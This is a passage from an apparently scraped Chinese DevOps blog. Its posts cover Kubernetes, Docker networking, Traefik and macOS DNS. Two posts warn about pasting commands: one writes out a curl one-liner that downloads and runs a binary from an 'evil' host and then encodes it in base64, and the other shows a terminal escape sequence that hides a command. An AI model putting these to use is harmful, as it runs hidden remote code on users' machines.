/etc/kubernetes/manifests/kube-apiserver.yaml\n```","tags":["kubernetes"]},{"title":"使用 iproute2 客製化你的 Container 網路","url":"/2021/04/29/","content":"\n\n## 前言\n\n我們都知道 Docker 有提供不同的網路模式供我們使用，從預設的 Bridge 到共用本機 Network Namespace 的 Host。我們甚至可以自訂自己的 Bridge 來切割不同網段，如此一來一些網路拓墣都架設都可以用 Docker 來完成。\n\n區別不同網段我們通常會使用不同的 Bridge 來分隔，通常會先建立自訂的 Bridge\n\n`docker network create --driver bridge testing-bridge`\n\n之後建立 container 時可以指定該 bridge 來使用該網路空間\n\n`docker run -it --net=testing-bridge alpine`\n```\n/ # ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n35: eth0@if36: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP\n    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff\n    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n```\n\n這時候可以發現 Docker 幫我建立好了 `172.18.0.2/16` 網段的介面可以使用，這時候你會發現該介面可以直接出得去外網，因為 Docker 建立好 Bridge，所以封包會從該 Bridge 到本機端出去。\n\n那我們可不可以不要讓 Container 有機會從本機讓封包流出去呢？\n\n（有時候要建立網路拓墣，不希望封包走本機的路由出去，希望封包從該網路路由到其他網路，也就是其他 Container）\n\n## 解決（使用 veth peer）\n\n要達成這件事，最快的做法就是自己建立 veth 並且將 peer 兩端直接綁在兩個 Container 上\n\n我們打算用 iproute2 直接管理網路，所以建立 containers 時使用 `--net=none`\n\n`docker run -itd --name=left --net=none alpine`\n`docker run -itd --name=right --net=none alpine`\n\n接著需要自行建立 Containers 們的 Network Namespace\n\n```\nleft_pid=$(docker inspect -f '{{.State.Pid}}' left)`\nright_pid=$(docker inspect -f '{{.State.Pid}}' right)`\nsudo mkdir -p /var/run/netns\nsudo ln -s /proc/$left_pid/ns/net /var/run/netns/$left_pid\nsudo ln -s /proc/$right_pid/ns/net /var/run/netns/$right_pid\n```\n\n接著建立 veth peer 並且命名為 `A` 以及 `B`\n\n`ip link add A type veth peer name B`\n\n```\nip link set A netns $left_pid # 設定 peer 端 A 到 left container\nip netns exec $left_pid ip link set dev A name eth0 # 設定 namespace 中的介面名稱\nip netns exec $left_pid ip link set eth0 up # 啟動介面\nip netns exec $left_pid ip addr add 10.113.1.1/24 dev eth0 # 設定 IP\n#ip netns exec $left_pid ip route add default via 10.113.1.254\n```\n\n新增預設路由的部分註解掉是因為我們將 Containers 用 veth peer 接起來，本來就是通的，所以不需要有預設路由也可以到達另外一個 Container。可以依照情況去設定你的預設路由\n\n接著設定 Container right\n\n```\nip link set B netns $right_pid\nip netns exec $right_pid ip link set dev B name eth0\nip netns exec $right_pid ip link set eth0 up\nip netns exec $right_pid ip addr add 10.113.1.2/24 dev eth0\n#ip netns exec $right_pid ip route add default via 10.113.1.254\n```\n\n設定完之後進去 Containers 你會發現他的網路介面為\n\n```\nubuntu@docker-env:~$ docker exec -it left sh\n/ # ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n33: eth0@if32: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP qlen 1000\n    link/ether 4e:1b:e1:22:8c:05 brd ff:ff:ff:ff:ff:ff\n    inet 10.113.1.1/24 scope global eth0\n       valid_lft forever preferred_lft forever\n```\n\n並且可以直接 ping 到另外一個 Container\n\n```\n/ # ping 10.113.1.2\nPING 10.113.1.2 (10.113.1.2): 56 data bytes\n64 bytes from 10.113.1.2: seq=0 ttl=64 time=0.062 ms\n64 bytes from 10.113.1.2: seq=1 ttl=64 time=0.155 ms\n```\n\n如此一來可以用此概念（搭配 Bridge）完成一些複雜的網路情境\n\n## 使用 Bridge\n\n實際的網路情況不太可能都用 peer 去接，就達成一個區網內有多台 Host 還是需要使用 Linux Bridge。就像 Docker 預設的 Bridge 模式般，那我們可不可以不要透過 Docker，自己建立 Bridge 來達成網路隔離，答案是可以。自己建立的話你會發現 Docker 除了把 Bridge 建立好以外，還會使用 iptables 把 Container 中的流量從 Host 往外送，我們如果不想要讓封包有機會從 Host 流出，自己建立 Bridge 把 veth peer 一端接上 Container 一端接上 Bridge 也是一個方法！\n\n首先，一樣建立兩個 Containers\n\n```\ndocker run -itd --network=none --name left alpine\ndocker run -itd --network=none --name right alpine\n```\n\n接下來手動建立 Linux Bridge\n\n```\nbrctl addbr br0\nip link set dev br0 up\n```\n\n建立 veth peer 並且命名為 left-eth0, left-veth0\nleft-eth0 這端要放入 Container 的 Network Namespace 中\n\n```\nip link add dev left-eth0 type veth peer name left-veth0\nip link add dev right-eth0 type veth peer name right-veth0\n```\n\n此時你的 Host 上會有四個新增的介面\n\n取得 Containers 的 Pid 用來將 peer 加入該 Pid 的 Network Namespace\n\n```\nleft_pid=$(docker inspect left -f {{.State.Pid}})\nright_pid=$(docker inspect right -f {{.State.Pid}})\n\nip link set left-eth0 netns ${left_pid} name eth0\nip link set right-eth0 netns ${right_pid} name eth0\n```\n\n加入成功後，在 Host 上可以看到網卡從剛才的四個變成兩個\n\n在 Container 中也會看到裡面的介面多了 eth0\n\n將 veth peer 另一端接上我們自行新增的 Linux Bridge，並且將網卡啟動\n\n```\nbrctl addif br0 left-veth0\nbrctl addif br0 right-veth0\n\nip link set dev left-veth0 up\nip link set dev right-veth0 up\n```\n\n接下來我們要從 Host 上設定 Container 中的介面，因為該已經在不同網路空間，所以我們需要自行 mapping，不然 iproute2 會找不到該網路介面\n\n```\nln -s /proc/$left_pid/ns/net /var/run/netns/$left_pid\nln -s /proc/$right_pid/ns/net /var/run/netns/$right_pid\nip netns show\n```\n\n那為何不在 Container 中做設定？因為這樣子需要 Container 具備特定的 Linux Capability\n\n```\nip netns exec $left_pid ip addr add 10.113.1.1/24 dev eth0\nip netns exec $left_pid ip link set eth0 up\nip netns exec $right_pid ip addr add 10.113.1.2/24 dev eth0\nip netns exec $right_pid ip link set eth0 up\n```\n\n接下來就可以使用 ping 來檢查是否 Containers 之間網路有通\n\ndocker exec left ping 10.113.1.2 -c3\ndocker exec right ping 10.113.1.1 -c3\n\n如果沒通的話，可以看一下 iptables 的 FORWARD chain 是不是被 DROP 掉了，是的話先把 Policy 改成 ACCEPT 即可\n\n通常我們使用 Docker 去建立 Bridge 的話，這些 iptables 規則都是 Docker 幫我們處理的，所以我們現在需要自行修改 iptables。\n## 題外\n\nDocker 提供的網路選項不多，畢竟他主要是用來做資源隔離。除了以上問題沒辦法用內建的網路選項外，一個 Container 假設有多個網路環境，也沒辦法在 Container 啟動時指定預設路由，只能用比較拐彎抹角的方式在 entrypoint 或是 commands 做。","tags":["docker"]},{"title":"不停機替換 Kubernetes CRI","url":"/2021/04/17/","content":"\n## 問題\n\n今天嘗試將 CRI 從預設的 dockershim 替換至 CRI-O，網路上的教學都是教你更換完畢之後使用 kubeadm 重新起一個 Cluster。但我的情境需要對現有的 Cluster 做替換，於是自己研究了一下如何不停機替換 CRI。\n\n## 替換 CRI\n\n首先將你需要替換的節點先設 drain\n\n`kubectl drain worker-node-1 --ignore-daemonsets`\n\n之後進入節點，將原本的 CRI dockershim 關閉\n\n`systemctl stop docker`\n\n我打算替換成 CRI-O，所以請先確定你想要替換的 CRI 已經安裝完畢，並且已經啟動：\n\n`systemctl status crio`\n\n```\n● crio.service - Container Runtime Interface for OCI (CRI-O)\n   Loaded: loaded (/usr/lib/systemd/system/crio.service; enabled; vendor preset: disabled)\n   Active: active (running) since 六 2021-04-17 02:25:09 EDT; 15min ago\n     Docs: https://github.com/cri-o/cri-o\n Main PID: 22001 (crio)\n    Tasks: 21\n   Memory: 1.1G\n   CGroup: /system.slice/crio.service\n           └─22001 /usr/bin/crio\n```\n\n接著照著網路上的教學，修改 `/usr/lib/systemd/system/kubelet.service.d/10-kubeadm.conf`\n\n並且增加\n\n```\nEnvironment=\"KUBELET_EXTRA_ARGS=--feature-gates='AllAlpha=false,RunAsGroup=true' --container-runtime=remote --cgroup-driver=systemd --container-runtime-endpoint='unix:///var/run/crio/crio.sock' --runtime-request-timeout=5m\"\n```\n\n但是重啟 kubelet 之後會發現毫無作用（用 `systemctl status kubelet` 可以檢查啟動參數）\n\n為何會毫無作用，是因為該檔案是 kubeadm 啟動時讀取的，但是我打算不停機所以不考慮使用 kubeadm 重啟，我打算在每一個節點上重啟 kubelet 來替換，所以需要針對 kubelet 來設定啟動參數。\n\n於是我在該檔案找到了 EnvironmentFile 參數，並且值為 `/etc/sysconfig/kubelet`\n\n於是我在 `/etc/sysconfig/kubelet` 加入了\n\n```\nKUBELET_EXTRA_ARGS=--feature-gates='AllAlpha=false,RunAsGroup=true' --container-runtime=remote --cgroup-driver=systemd --container-runtime-endpoint='unix:///var/run/crio/crio.sock' --runtime-request-timeout=5m\n```\n\n之後重啟 kubelet\n\n`systemctl daemon-reload`\n`systemctl restart kubelet`\n\n可以看到啟動參數已經吃進去了\n\n```\n● kubelet.service - kubelet: The Kubernetes Node Agent\n   Loaded: loaded (/usr/lib/systemd/system/kubelet.service; enabled; vendor preset: disabled)\n  Drop-In: /usr/lib/systemd/system/kubelet.service.d\n           └─10-kubeadm.conf\n   Active: active (running) since 六 2021-04-17 02:25:09 EDT; 22min ago\n     Docs: https://kubernetes.io/docs/\n Main PID: 22114 (kubelet)\n    Tasks: 16\n   Memory: 51.2M\n   CGroup: /system.slice/kubelet.service\n           └─22114 /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --network-plugin=cni --pod-infra-container-image=k8s.gcr.io/pause:3.2 --feature-gates=AllAlpha=false,RunAsGroup=true --container-runtime=remote --cgroup-driver=systemd --container-runtime-endpoint=unix:///var/run/crio/crio.sock --runtime-request-timeout=5m\n```\n\n使用\n\n`kubectl get node -o wide`\n\n也可以發現 CRI 已經更換\n\n重新讓該節點可以被使用\n\n`kubectl uncordon worker-node-1`\n\n## 注意事項\n\n1. 替換 Control Plane 節點時請一定要把原本的 CRI 關閉，否則系統元件會佔用你節點上的 Port，導致使用新的 CRI 無法順利將系統元件跑起來！\n\n2. 部署完畢後 coredns 報錯\n\n```\ncontainer_linux.go:349: starting container process caused \"error adding seccomp rule for syscall socket: requested action matches default action of filter\"               │   Warning  FailedCreatePodSandBox  36m  kubelet, worker-node-2  Failed to create pod sandbox: rpc error: code = Unknown desc = container create failed: time=\"2021-04-17\n│ T02:23:10-04:00\" level=error msg=\"container_linux.go:349: starting container process caused \\\"error adding seccomp rule for syscall socket: requested action matches def  │ ault action of filter\\\"\"\n```\n\n看到這篇：https://github.com/cri-o/cri-o/issues/4491\n\n將 runc 升級為 1.0.0-rc93 後解決\n\n`yum update runc -y`\n\n3. 部署完畢後發現 busybox 不能使用 ping（權限不足），增加 CRI-O 的 capabilities，預設只有\n\n```\ndefault_capabilities = [\n  \"CHOWN\",\n  \"DAC_OVERRIDE\",\n  \"FSETID\",\n  \"FOWNER\",\n  \"SETGID\",\n  \"SETUID\",\n  \"SETPCAP\",\n  \"NET_BIND_SERVICE\",\n  \"KILL\",\n]\n```\n","tags":["kubernetes"]},{"title":"一次 Traefik 與 TLS 的踩雷經驗","url":"/2021/03/26/","content":"\n## 問題點\n\n部署 ArgoCD 進 Kubernetes 完畢時，發現 ArgoCD 開了 80, 443 兩個 Service Port，對應到的 Container Port 都同樣是 8080。如果你用 http 請求 ArgoCD 的 Web 時，他會請你跳轉到 https。\n\n為了讓外部的 User 可以使用 ArgoCD，我設定了 Traefik 的 IngressRoute 來存取該資源，但是卻一直沒有成功。\n\n我的架構環境為\n\n```\n                    |\nNginx-proxy（外部）  | -> K8s-worker(Traefik/Ingress) -> ArgoCD-server(service)\n                    |\n```\n\n## Debug\n\n### IngressRoute\n\n為了簡化環境（debug），於是我從 Cluster 內部去打 Ingress，發現回應一直都是 404，但是我把 Service 做 port forward 到 local 端，卻可以正常運作，所以推測是 ArgoCD 的 IngressRoute 規則有誤，而我使用的規則是ArgoCD 官方文件提到的：\n\n```yaml\napiVersion: traefik.containo.us/v1alpha1\nkind: IngressRoute\nmetadata:\n  name: argocd-server\n  namespace: argocd\nspec:\n  entryPoints:\n    - websecure\n  routes:\n    - kind: Rule\n      match: Host(`argocd.example.com`)\n      priority: 10\n      services:\n        - name: argocd-server\n          port: 80\n    - kind: Rule\n      match: Host(`argocd.example.com`) && Headers(`Content-Type`, `application/grpc`)\n      priority: 11\n      services:\n        - name: argocd-server\n          port: 80\n          scheme: h2c\n  tls:\n    certResolver: default\n    options: {}\n```\n\n於是我使用（從 Cluster 節點上直接打 Ingress）\n\n```\ncurl https://argocd.example.com -k\n> href=\"https://argocd.example.com/\">Temporary Redirect</a>.\n\ncurl https://argocd.example.com -k -L\n> curl: (47) Maximum (50) redirects followed\n```\n\n我查了 Traefik 的官方文件發現\n\n```\nThere are 3 ways to configure the backend protocol for communication between Traefik and your pods:\n\n    Setting the scheme explicitly (http/https/h2c)\n    Configuring the name of the kubernetes service port to start with https (https)\n    Setting the kubernetes service port to use port 443 (https)\n\nIf you do not configure the above, Traefik will assume an http connection.\n```\n\n簡單來說，Treafik 並不會因為你使用 https 去打 Ingress，就使用該協定幫你打後端的 Pod (or Service)，如果你指定 Service 為 443 Port 那麼他就幫你用 https 去跟後端的 Pod 建立連線，而預設都是走 http 連線。\n\n所以應該將 yaml 檔案改為\n\n```yaml\n    routes:\n        - kind: Rule\n        match: Host(`argocd.example.com`)\n        priority: 10\n        services:\n            - name: argocd-server\n            port: 443\n```\n\n或是指定 protocol\n\n```yaml\n    routes:\n        - kind: Rule\n        match: Host(`argocd.tcs-proxy.cscc`)\n        priority: 10\n        services:\n            - name: argocd-server\n            port: 80\n            scheme: https\n```\n\n來強制 IngressRoute 與 ArgoCD 使用 https 建立連線。\n\n另外，因為 ArgoCD 的憑證是自行簽發的，Traefik 並認不得該單位，所以 Traefik 必須設定 `--serversTransport.insecureSkipVerify=true` 來忽略憑證的驗證\n\n### Reverse Proxy to Cluster\n\n```\n                    |\nNginx-proxy（外部）  |  -> K8s-worker(Traefik/Ingress) -> ArgoCD-server(service)\n                    |\n```\n\n我的情境中，Cluster 外部還有一台 Load Balancer 會將流量導致 Cluster 的 Worker Nodes，但是 Traefik 已經有憑證了，後端的 ArgoCD 也有，我並不想要有這麼多的憑證會造成連線的效能耗損，於是查到可以使用 tls passthrough 的方式來讓 Nginx 不處理封包的加密解密，直接將該封包 reverse proxy 到後端。\n\n但是該方式會產生一個問題，Nginx 如果不做解密，那麼也看不到封包 L7 的 Host 欄位，於是原本的 virtual host 方式就無法正常路由，解決方式為使用 TLS 的 SNI 來判斷路由。\n\n```\nstream {\n    map $ssl_preread_server_name $name {\n        # 在此設定不同 SNI 對應到不同後端;\n        argocd.tcs-proxy.cscc K8S_WORKER_443;\n        default https_default_backend;\n    }\n\n    upstream K8S_WORKER_443 {\n        server worker-node-1:443;\n        server worker-node-2:443;\n        server worker-node-3:443;\n    }\n\n    server {\n        listen 443;\n        proxy_pass $name; # 如果沒有路由需求，也可以直接設定 proxy_pass K8S_WORKER_443;\n        ssl_preread on; # 該選項需要打開，才有辦法讀取 SNI\n    }\n}\n```\n\n要注意的是，通常 Nginx 的設定都會在 http directive，但是 tls passthrough 必須要設定在 stream directive 下，意味著原本的 log formatter 也無法使用了（可以去 nginx.conf 看一下）。\n\n所以我們必須增加新的 log formatter 在 steam directive 下方\n\n```\nstream {\n    log_format proxy '$remote_addr - [$time_local] '\n                    '$protocol $status $bytes_sent $bytes_received '\n                    '$session_time \"$upstream_addr\" '\n                    '\"$upstream_bytes_sent\" \"$upstream_bytes_received\" \"$upstream_connect_time\" '\n                    '$remote_addr $remote_port $server_addr $server_port';\n    server {\n        access_log      /var/log/tcp-stream-access.log proxy;\n        #...\n        #...\n    }\n}\n```\n\n如此一來會發現外層的 Nginx 沒有上憑證也可以正常使用叢集內部憑證來對連線進行加密！","tags":["kubernetes","traefik","nginx"]},{"title":"macOS-中-VPN-解析域名錯誤","url":"/2021/01/06/","content":"\n# TL;DR\n\nmacOS 中的 DNS 順序並沒有意義（儘管系統還讓你移動順序），決定 DNS Server 使用隨機方式來選擇。如果想要指定特定網域使用特定的 DNS Server，請使用 `scutil` 指令設定。\n\n`/etc/resolv.conf` 的 nameserver 順序也相同沒有意義，系統採隨機方式選擇 nameserver。\n\n# 環境\n\n連上實驗室的 VPN 後，發現 VPN 中的 domain 都解析失敗，但是 dig 卻是正常的。看了一下 DNS 設定也都正常，於是開始找原因......\n\n# DNS 解析問題\n\n假設今天我要解析 website.mydomain.org（內網），我的 `/etc/resolve.conf` 如下\n\n```\nsearch mydomain.org\nnameserver 10.0.0.1 # 內網 DNS 1\nnameserver 10.0.0.2 # 內網 DNS 2\nnameserver 1.1.1.1\nnameserver 8.8.8.8\n```\n\n此時有機率輪到後面兩組，造成解析失敗，所以我們需要額外設定\n\n# 解決\n\n列出本機上 dns 設定\n\n`scutil --dns`\n\n我們需要針對特定的網域使用特定的 DNS Server 來解析\n\n首先建立目錄，位置必須是 `/etc/resolver`\n\n`sudo mkdir /etc/resolver`\n\n裡面的檔名依照 domain 去設定，假設我要指定 mydomain.org 下的 nameserver，我的檔名就是 `mydomain.org`\n\n接者把該 domain 用到的 nameserver 寫上，格式與 `/etc/resolv.conf` 一樣\n\n`echo 'nameserver 10.0.0.1' > /etc/resolver/mydomain.org`\n`echo 'nameserver 10.0.0.2' > /etc/resolver/mydomain.org`\n\n設定之後再度訪問 `website.mydomain.org` 就可以正常解析了\n\n### 參考\n\n- [Domain-specific DNS server on your Macbook Pro](https://medium.com/@jamieeduncan/i-recently-moved-to-a-macbook-for-my-primary-work-laptop-7c704dbaff59)\n\n","tags":["macOS","DNS"]},{"title":"與 minikube 共享 local docker image","url":"/2020/08/31/","content":"\n為了將服務跑在 K8s 中，容器化是必須的。在程式即將部署之際，會需要測試一些 K8s 中的環境變數是否可以被程式正常讀取，或是為了符合 K8s 環境，將程式打包成容器映像試著部署上叢集試試看有沒有問題。這個過程的工作流大致上如下：\n\n```\n打包 (docker build . -t my-app:0.1)\n部署 (kubectl apply -f deploy.yaml)\n確認是否有問題，有的話修改程式，然後繞回第一步\n```\n\n我們在 Local 開發時，可能會使用 minikube 來當作測試用的部署環境，但是 minikube 實際上是起一個新的 docker-daemon，他並不認識 macOS 或是 Linux 上的 docker-daemon。也就是說，你在 Local 將 image build 完畢，在 minikube 中並無法存取 Local 的 Docker Registry。這對於正在快速開發測試的人來說極為不便，我們很可能改一行 code 就需要馬上看是否在 K8s 環境能正常運作。\n\n要解決這個問題大致上有幾種方法：\n\n1. 使用外部 Docker Hub 來當作 Docker Registry\n    缺點：暴露在外網、外網流量慢\n2. 在 Local 跑一個 Docker Registry，讓 Local 與 minikube 共用\n    缺點：Local IP 如果換掉，yaml 設定檔的 image 位置又要重寫\n3. 在 minikube 環境中跑一個 Docker Registry，port-forward 到 Local 上\n    缺點：第一次設定較繁瑣，但大致上已經算好用\n\n這邊要提的方法個人覺得較方便，但同時也有一些不方便的地方\n\n該方法原理是直接在 build image 時直接存進 minikube 的 Registry 中\n\n方法如下：\n\n`eval $(minikube docker-env)`\n\n`docker build -t my-app .`\n\n此時可以用 `minikube ssh` 進去看 `docker images` 會發現 Image 已經進到 Registry 中\n\n最後在 yaml 檔有用到該 image 的地方加上\n\n```yaml\nimagePullPolicy: Never\n```\n\n確保在 pull image 時只會拉 Local 的 Image\n\n該方法是透過重新指定環境變數來改變 docker 指令操作 docker-deamon 的位置\n\n所以開一個新的 session 就要重新設定一次，算是一個小缺點\n","tags":["kubernetes","docker"]},{"title":"在 K8S 中使用 Traefik 作為 Ingress Controllers","url":"/2020/07/11/","content":"\n## 前言\n\nK8S 中的 Ingress Controllers 並沒有實作，可以自己使用各種版本。在 Minikube 中的 Ingress Controllers 預設是用 [NGINX Ingress Controller](https://kubernetes.github.io/ingress-nginx/)，然而 NGINX Ingress Controller 的功能非常陽春，官網有提供一系列的 [Ingress Controller](https://kubernetes.io/docs/concepts/services-networking/ingress-controllers/) 給各位參考，該文章紀錄如何使用 [Traefik](https://docs.traefik.io/) 這個 Edge Router 作為 Ingress Controller。\n\n\n## 正文\n\n在操作 K8S 之前請先確定你正在操作的叢集是練習環境：\n\n`kubectl cluster-info`\n\nTraefik 這套工具可以將外部的流量吸收，並且透過自己定義的路由來將流量往內部的 Service 打。我們希望可以透過 URL 的 Path 來定義不同服務的路由，將流量打向不同的服務。\n\n在 NGINX Ingress Controller 中要做這件事情，要在 `annotations` 中加上 `nginx.ingress.kubernetes.io/rewrite-target: /`\n\n```yaml\napiVersion: networking.k8s.io/v1beta1\nkind: Ingress\nmetadata:\n  annotations:\n    nginx.ingress.kubernetes.io/rewrite-target: /\n  name: rewrite\n  namespace: default\nspec:\n...\n...\n...\n```\n\n避免不同 App 吃到不同的路由位置無法產生正確的回應（假設我們的服務入口都在根路徑 Ex: `app-foo/` ）。\n\n但 Traefik 要達成這件事情必須透過 [Middleware](https://docs.traefik.io/middlewares/overview/) 這個組件（Traefik 定義的功能），簡單來說我們要把讀進來的 /path，strip 掉並且將導向到指定的 Service 上。\n\n![](https://docs.traefik.io/assets/img/middleware/overview.png)\n\n要使用 Traefik Middleware 有兩種方式：\n\n- IngressRoute (CustomResourceDefinitions)\n- 在 Ingress 中使用 annotation 定義\n\n個人覺得第二點比較直覺，所以選擇第二種方式。\n\n首先，先建立 Middleware 這個 CRD，並且做 ClusterRoleBinding：\n\n```yaml\napiVersion: apiextensions.k8s.io/v1beta1\nkind: CustomResourceDefinition\nmetadata:\n  name: middlewares.traefik.containo.us\n\nspec:\n  group: traefik.containo.us\n  version: v1alpha1\n  names:\n    kind: Middleware\n    plural: middlewares\n    singular: middleware\n  scope: Namespaced\n\n---\nkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: traefik-ingress-controller\n\nrules:\n  - apiGroups:\n      - \"\"\n    resources:\n      - services\n      - endpoints\n      - secrets\n    verbs:\n      - get\n      - list\n      - watch\n  - apiGroups:\n      - extensions\n    resources:\n      - ingresses\n    verbs:\n      - get\n      - list\n      - watch\n  - apiGroups:\n      - extensions\n    resources:\n      - ingresses/status\n    verbs:\n      - update\n  - apiGroups:\n      - traefik.containo.us\n    resources:\n      - middlewares\n      - ingressroutes\n      - traefikservices\n      - ingressroutetcps\n      - ingressrouteudps\n      - tlsoptions\n      - tlsstores\n    verbs:\n      - get\n      - list\n      - watch\n\n---\nkind: ClusterRoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: traefik-ingress-controller\n\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: traefik-ingress-controller\nsubjects:\n  - kind: ServiceAccount\n    name: traefik-ingress-controller\n    namespace: default\n```\n\n將 Traefik 本身跑起來：\n\n```yaml\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  namespace: default\n  name: traefik-ingress-controller\n\n---\nkind: Deployment\napiVersion: apps/v1\nmetadata:\n  namespace: default\n  name: traefik\n  labels:\n    app: traefik\n\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: traefik\n  template:\n    metadata:\n      labels:\n        app: traefik\n    spec:\n      serviceAccountName: traefik-ingress-controller\n      containers:\n        - name: traefik\n          image: traefik:v2.2\n          args:\n            - --api.insecure\n            - --accesslog\n            - --entrypoints.web.Address=:8000\n            - --providers.kubernetesingress\n            - --providers.kubernetescrd\n          ports:\n            - name: web\n              containerPort: 8000\n            - name: admin\n              containerPort: 8080\n```\n\n為 Traefik 設定 Service：\n\n```yaml\napiVersion: v1\nkind: Service\nmetadata:\n  name: traefik\n\nspec:\n  ports:\n    - protocol: TCP\n      name: web\n      port: 8000\n    - protocol: TCP\n      name: admin\n      port: 8080\n  selector:\n    app: traefik\n```\n\n建立 Ingress 與 Middleware(stripprefix)：\n\n```yaml\napiVersion: networking.k8s.io/v1beta1\nkind: Ingress\nmetadata:\n  name: yy-ingress\n  annotations:\n    traefik.ingress.kubernetes.io/router.entrypoints: web\n    traefik.ingress.kubernetes.io/router.middlewares: default-stripprefix@kubernetescrd\nspec:\n  rules:\n  - host: yy.k8s\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: whales\n          servicePort: 80\n      - path: /app\n        backend:\n          serviceName: whales\n          servicePort: 80\n      - path: /whoami\n        backend:\n          serviceName: whoami\n          servicePort: 80\n  - host: admin.yy.k8s\n    http:\n      paths:\n        - path: /\n          backend:\n            serviceName: traefik\n            servicePort: 8080\n\n---\napiVersion: traefik.containo.us/v1alpha1\nkind: Middleware\nmetadata:\n  name: stripprefix\nspec:\n  stripPrefix:\n    prefixes:\n      - /app\n      - /whoami\n```\n\n要注意的重點有：\n- CRD 中的權限要記得 middwares 有被加進去。\n- 要使用 Ingress，Traefik 跑起來時要加上 `--providers.kubernetesingress`\n- 如果用 IngressRoute 跑，要加上 `--providers.kubernetescrd`\n- annotations 中 middleware 的名字最前面需要加上 namespace（本文使用 default）\n- 如果直接貼 Traefik 官網的 user-guides/crd-acme，要注意它並沒有加上 `--providers.kubernetesingress`，所以無法與 Ingress 正確綁定\n- 在 local 測試可以用 `kubectl port-forward svc/traefik foo-port:8080` 連到 dashboard 來 debug\n\n更多詳細設定可以參考 [user-guides/crd-acme](https://docs.traefik.io/user-guides/crd-acme/#ingressroute-definition)，以上的設定比較精簡，此文章只有留必要部分而已。\n\n完整的設定可以到 [GitHub Repo](https://github.com/yiyu0x/k8s-traefik-example) 上面看。","tags":["kubernetes"]},{"title":"眼見為憑？利用終端機特性藏匿惡意指令","url":"/2020/04/29/","content":"\n## 前言\n\n對於 Linux 使用者或是軟體工程師來說，終端機是每天必須用到的軟體之一。尤其是那些注重開發效率以及有在維護伺服器的工程師來說，我們都不希望雙手離開鍵盤，分散注意力。這種情況下，當我們要稍微檢視檔案內容時，會使用到以下幾個常用的工具：\n\n- cat\n- less\n- more\n- vim\n\n然而我們透過工具所看到的檔案內容，可以完全相信嗎？\n\n## 眼見為憑？\n\n### cat\n\n{% asciinema 325079 %}\n\n看過上述例子之後，你還敢只用 `cat` 確認檔案內容嗎？\n\n為何會發生這種事？原因在於終端機本身就會辨認幾個具有意義的特殊字元，你可能用過一些特別的工具可以讓終端機印出有顏色的字，就是利用到這種特性。\n\n那這些特殊字元可以操作終端機的哪些行為呢？\n\n- 移動游標到任意位置\n- 刪除任意印出的字元\n- 操作終端機視窗\n- 將不同按鍵對應到的終端機行為進行覆寫\n\n上述範例，就是透過移動終端機游標，讓兩行指令都印在同一個位置上（位置重疊，只會顯示覆蓋的指令），如此一來就可以隱藏被覆蓋的指令。\n\n### curl\n\n我們換 `curl -s` 試試\n\n{% asciinema 325095 %}\n\n看完這個例子之後，我相信你再也不敢相信肉眼看到的內容。\n\n### 結論\n\n如果要確認檔案的內容想要用 `cat` 的話，可以加上參數 `v`，顯示不可視字元。\n\n以第一個例子來說：`cat -v script.sh`\n\n```bash\n#!/bin/sh\n\necho \"evil!\"\nexit 0\n^[[2Aecho \"Hello World!\"\n```\n\n`^[[2A` 就是告訴終端機將游標往上移動兩行，繼續從該位置印出（覆蓋原本的 echo \"evil!\"）。\n\n可以的話，還是建議使用文字編輯器打開確認內容會比起直接印出內容在終端機來得可信。\n\n如果想要自己測試的話可以使用以下指令\n\n```bash\necho -e '#!/bin/sh\\n\\necho \"evil!\"\\nexit 0\\n\\033[2Aecho \"Hello World!\"\\n' > script.sh\nchmod a+x script.sh\n```\n\n或是你想深入了解終端機控制字元以及不同終端機的狀況可以參考 [Terminal Escape Injection](https://www.infosecmatter.com/terminal-escape-injection/#what-are-the-escape-sequences)。\n","tags":["資訊安全"]},{"title":"從駭客角度告訴你為何不要隨意複製指令","url":"/2020/03/16/","content":"\n相信很多人都有這樣的經驗，下指令時產生某某錯誤。這個錯誤可能沒見過，也可能是之前遇過但是忘記怎麼解。但我們只要將錯誤複製起來，貼上搜尋引擎，馬上就會跳出各種網頁可以參考，無倫是知名的程式討論論壇，或著是官方文件，又或著是個人自行架設的部落格。看到指令就貼上這個習慣，是開發者的眾多壞習慣之一。\n\n駭客可以很巧妙的利用這一點，將精心製作的後門程式（或其他惡意程式），透過包裝，誘騙受害者（可能就是你）去執行。\n\n## 生產惡意指令\n\n假如今天我想要讓受害者的電腦執行一條指令就被植入後門，我會這麼做：\n\n`curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil`\n\n首先先透過 `curl` 下載遠端編譯好的惡意程式，並且給予該程式執行權限，然後執行，最後刪除（匿蹤）。\n\n但這種指令我想應該沒有人會直接貼上執行，不但意圖明顯，而且還直接告訴受害者：「我打算下載來路不名的檔案，而且要執行它」。\n\n## 偽裝\n\n想要偽裝通常我們會將指令包裹成其他意圖，透過簡單的編碼來將這個惡意指令進行編碼，以下選用 base64 進行編碼：\n\n```\nY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\n```\n\n為何選擇使用 `base64`，原因是因為 